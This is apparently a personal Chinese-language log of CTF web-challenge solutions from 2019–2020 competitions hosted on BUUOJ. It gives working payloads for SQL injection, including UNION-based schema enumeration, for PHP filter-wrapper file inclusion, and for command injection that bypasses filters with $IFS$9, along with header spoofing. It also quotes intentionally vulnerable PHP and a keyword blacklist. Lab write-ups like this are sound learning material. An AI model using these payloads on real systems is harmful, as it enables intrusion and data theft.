# My bad

## 2021/06/30

### EasySQL

> 极客大挑战 2019

#### 题目

题目本身就是把用户输入放进一对单引号之中，想办法闭合单引号即可，无难度

#### payload

```
?username=bme&password=1' or '1'='1
```

## 2021/07/01

### Have fun

> 极客大挑战 2019

#### 题目

题目比较简单，打开页面源码，发现源码也包含在其中，发送Get请求`cat=dog`得到flag

```php
$cat=$_GET['cat'];
echo $cat;
if($cat=='dog'){
    echo 'Syc{cat_cat_cat_cat}';
}
```

#### payload

```
?cat=dog
```

### Include

> ACTF 2020

#### 题目

F12打开源码，发现一个`?file=flag.php`链接，点进去发现啥都没有，那只能先试试**伪协议**文件包含flag.php，得到base64的代码，解码后得到flag

#### payload

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

### Secret File

> 极客大挑战 2019

#### 题目

F12打开源码，发现一个`./Archive_room.php`的链接，点进去有一个**secret**按钮，点进去发现查阅结束，需要用Burp截包，截下数据包发现，有一个**302跳转**，其中包含`secr3t.php`页面，发现源代码。

```php
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

还是经典的伪协议读取，读取`flag.php`，得到flag

#### payload

```
?file=php://filter/read=convert.base64-encode/resource=flag.php
```

### Exec

> ACTF 2020

#### 题目

给了一个可以ping的框，F12打开源码，发现是命令执行，直接在框里输入命令绕过`127.0.0.1;ls`，得到目录下文件`index.php`，cat命令阅读源码，`ls`搜索目录发现上层目录中有`flag`文件，获取flag

```php
<?php 
if (isset($_POST['target'])) {
	system("ping -c 3 ".$_POST['target']);
}
?>
```

#### payload

```
127.0.0.1;ls -al /
```

## 2021/07/02

### LoveSQL

> 极客大挑战 2019

#### 题目

从名字就可以看出来，SQL注入的题，进来是个登录页面，随便输一下，Get请求发送`username`和`password`两个参数，从`password`下手试一下万能密码，竟然登录进去了，看起来是要在库里面找东西，还有回显的`username`和`password`，直接注入，比较简单

#### payload

```
?username=1&password=1' union select 1,2,'3

?username=1&password=1' union select 1,database(),'3 // return geek

?username=1&password=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='geek'),'3 //return l0ve1ysq1

?username=1&password=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'),'3 //return id,username,password

?username=1&password=1' union select 1,(select group_concat(password) from l0ve1ysq1),'3 // return flag
```

### Ping Ping Ping

> GXYCTF 2019

#### 题目

还是个ping命令的题，直接上`;ls`，回显出两个文件，直接`cat`读取，被拦截了（），试试绕过，发现很多符号也被过滤了，用命令执行的绕过`$IFS$9`来绕过空格，显示出源码，发现flag被正则表达式包住了，这里采用拼接的形式进行绕过

```php
<?php
if(isset($_GET['ip'])){
  $ip = $_GET['ip'];
  if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
    echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
    die("fxck your symbol!");
  } else if(preg_match("/ /", $ip)){
    die("fxck your space!");
  } else if(preg_match("/bash/", $ip)){
    die("fxck your bash!");
  } else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
    die("fxck your flag!");
  }
  $a = shell_exec("ping -c 4 ".$ip);
  echo "
";
  print_r($a);
}

?>
```

#### payload

```
?ip=;a=g;cat$IFS$9fla$a.php
```

### Knife

> 极客大挑战 2019

#### 题目

题目没啥好说的，直接**蚁剑/菜刀**连就行了

#### payload

### Http

> 极客大挑战 2019

#### 题目

Burp搜索站点，可以发现一个隐藏页面`Secret.php`，访问发现返回`It doesn't come from 'https://www.Sycsecret.com'`，那就添加`Referer`，发现又返回`Please use "Syclover" browser`，改`User-Agent`，发现又返回`No!!! you can only read this locally!!!`，添加`X-Forwarded-For:127.0.0.1`，拿到flag

#### payload

```http
GET /Secret.php HTTP/1.1
Host: node3.buuoj.cn:28969
Referer:https://www.Sycsecret.com
X-Forwarded-For:127.0.0.1
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent:Syclover
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: UM_distinctid=17a52dafb251c-0133abcdf6c6a9-6373264-384000-17a52dafb261436
Connection: close
```
## 2021/07/06

### Upload

### PHP
